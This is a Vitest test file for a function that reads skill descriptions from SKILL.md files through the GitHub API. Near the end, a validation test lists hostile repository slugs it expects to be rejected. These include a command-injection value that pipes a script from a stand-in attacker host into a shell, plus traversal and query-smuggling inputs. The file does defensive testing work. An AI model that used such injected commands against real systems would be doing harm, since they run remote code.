import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import { getSkillDescriptions } from './get-skill-descriptions';
import { GithubApiError } from './request';

const API = 'https://api.github.com/repos/octocat/hello-world/git';

interface Entry {
  path: string;
  sha: string;
  type?: 'blob' | 'tree';
}

const fetchMock = vi.fn();

function json(status: number, body: unknown) {
  return {
    ok: status >= 200 && status < 300,
    status,
    statusText: status === 200 ? 'OK' : 'Error',
    json: async () => body
  };
}

function toBlob(text: string) {
  const base64 = Buffer.from(text, 'utf8').toString('base64');

  // NOTE: GitHub wraps base64 content with newlines
  return {
    encoding: 'base64',
    content: base64.replace(/(.{20})/g, '$1\n')
  };
}

function skillFile(description?: string) {
  return description === undefined
    ? '---\nname: x\n---\n# Skill'
    : `---\nname: x\ndescription: ${description}\n---\n# Skill`;
}

interface GithubStub {
  entries: Entry[];
  blobs: Record<string, string | number>;
  treeStatus?: number;
}

/** Routes the GitHub API calls: a recursive tree and blobs by sha. */
function stubGithub({ entries, blobs, treeStatus = 200 }: GithubStub) {
  fetchMock.mockImplementation(async (url: string) => {
    if (url === `${API}/trees/main?recursive=1`) {
      return treeStatus === 200
        ? json(200, {
            truncated: false,
            tree: entries.map(entry => ({ type: 'blob', ...entry }))
          })
        : json(treeStatus, { message: 'API rate limit exceeded' });
    }

    const sha = url.startsWith(`${API}/blobs/`)
      ? url.slice(`${API}/blobs/`.length)
      : undefined;
    const blob = sha === undefined ? undefined : blobs[sha];

    if (typeof blob === 'string') {
      return json(200, toBlob(blob));
    }

    return json(typeof blob === 'number' ? blob : 404, {
      message: 'Not Found'
    });
  });
}

const options = (skillNames: string[], defaultBranch = 'main') => ({
  repoSlug: 'octocat/hello-world',
  defaultBranch,
  skillNames
});

describe('getSkillDescriptions', () => {
  beforeEach(() => {
    fetchMock.mockReset();
    vi.stubGlobal('fetch', fetchMock);
    vi.spyOn(console, 'log').mockImplementation(() => undefined);
  });

  afterEach(() => {
    vi.unstubAllGlobals();
    vi.restoreAllMocks();
  });

  it('should map each skill name to the description of its SKILL.md', async () => {
    stubGithub({
      entries: [
        { path: 'alpha/SKILL.md', sha: 'sha-a' },
        { path: 'beta/SKILL.md', sha: 'sha-b' }
      ],
      blobs: {
        'sha-a': skillFile('Does alpha things'),
        'sha-b': skillFile('"Does beta things"')
      }
    });

    const result = await getSkillDescriptions(options(['alpha', 'beta']));

    expect(result).toEqual({
      alpha: 'Does alpha things',
      beta: 'Does beta things'
    });
  });

  it('should match a SKILL.md nested under a directory named after the skill', async () => {
    stubGithub({
      entries: [{ path: '.agents/skills/alpha/SKILL.md', sha: 'sha-a' }],
      blobs: { 'sha-a': skillFile('Nested alpha') }
    });

    const result = await getSkillDescriptions(options(['alpha']));

    expect(result).toEqual({ alpha: 'Nested alpha' });
  });

  it('should match the manifest file name case-insensitively', async () => {
    stubGithub({
      entries: [{ path: 'alpha/skill.md', sha: 'sha-a' }],
      blobs: { 'sha-a': skillFile('Lowercase manifest') }
    });

    const result = await getSkillDescriptions(options(['alpha']));

    expect(result).toEqual({ alpha: 'Lowercase manifest' });
  });

  it('should not match a directory that only ends with the skill name', async () => {
    stubGithub({
      entries: [{ path: 'not-alpha/SKILL.md', sha: 'sha-x' }],
      blobs: { 'sha-x': skillFile('Wrong skill') }
    });

    const result = await getSkillDescriptions(options(['alpha']));

    expect(result).toEqual({});
  });

  it('should decode a UTF-8 description', async () => {
    stubGithub({
      entries: [{ path: 'alpha/SKILL.md', sha: 'sha-a' }],
      blobs: { 'sha-a': skillFile('Révision — ✓ 日本語') }
    });

    const result = await getSkillDescriptions(options(['alpha']));

    expect(result).toEqual({ alpha: 'Révision — ✓ 日本語' });
  });

  it('should omit a skill that has no SKILL.md', async () => {
    stubGithub({
      entries: [{ path: 'alpha/SKILL.md', sha: 'sha-a' }],
      blobs: { 'sha-a': skillFile('Does alpha things') }
    });

    const result = await getSkillDescriptions(options(['alpha', 'ghost']));

    expect(result).toEqual({ alpha: 'Does alpha things' });
  });

  it('should omit a skill whose SKILL.md has no description', async () => {
    stubGithub({
      entries: [
        { path: 'alpha/SKILL.md', sha: 'sha-a' },
        { path: 'beta/SKILL.md', sha: 'sha-b' }
      ],
      blobs: { 'sha-a': skillFile(), 'sha-b': skillFile('Does beta things') }
    });

    const result = await getSkillDescriptions(options(['alpha', 'beta']));

    expect(result).toEqual({ beta: 'Does beta things' });
  });

  it('should omit a skill whose blob request fails and keep the others', async () => {
    stubGithub({
      entries: [
        { path: 'alpha/SKILL.md', sha: 'sha-a' },
        { path: 'beta/SKILL.md', sha: 'sha-b' }
      ],
      blobs: { 'sha-a': 500, 'sha-b': skillFile('Does beta things') }
    });

    const result = await getSkillDescriptions(options(['alpha', 'beta']));

    expect(result).toEqual({ beta: 'Does beta things' });
  });

  it('should request the recursive tree of the URL-encoded default branch', async () => {
    fetchMock.mockResolvedValue(json(200, { truncated: false, tree: [] }));

    await getSkillDescriptions(options(['alpha'], 'feature/x'));

    expect(fetchMock).toHaveBeenCalledWith(
      `${API}/trees/feature%2Fx?recursive=1`,
      expect.anything()
    );
  });

  it('should not call GitHub when no skill names are given', async () => {
    const result = await getSkillDescriptions(options([]));

    expect(result).toEqual({});
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it.each([
    'acme/tools;curl -s https://evil.example/x|sh;#',
    'acme/../x',
    'acme/x?per_page=1',
    'acme'
  ])(
    'should reject the unsafe repository slug %j without calling GitHub',
    async repoSlug => {
      const promise = getSkillDescriptions({
        ...options(['alpha']),
        repoSlug
      });

      await expect(promise).rejects.toThrow('Unsafe repository slug');
      expect(fetchMock).not.toHaveBeenCalled();
    }
  );

  it('should reject an unsafe repository slug even when no skill names are given', async () => {
    const promise = getSkillDescriptions({
      ...options([]),
      repoSlug: 'acme/tools;id'
    });

    await expect(promise).rejects.toThrow('Unsafe repository slug');
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it('should reject with a GithubApiError when the tree request is rate-limited', async () => {
    stubGithub({ entries: [], blobs: {}, treeStatus: 403 });

    const promise = getSkillDescriptions(options(['alpha']));

    await expect(promise).rejects.toBeInstanceOf(GithubApiError);
    await expect(promise).rejects.toMatchObject({ status: 403 });
  });
});
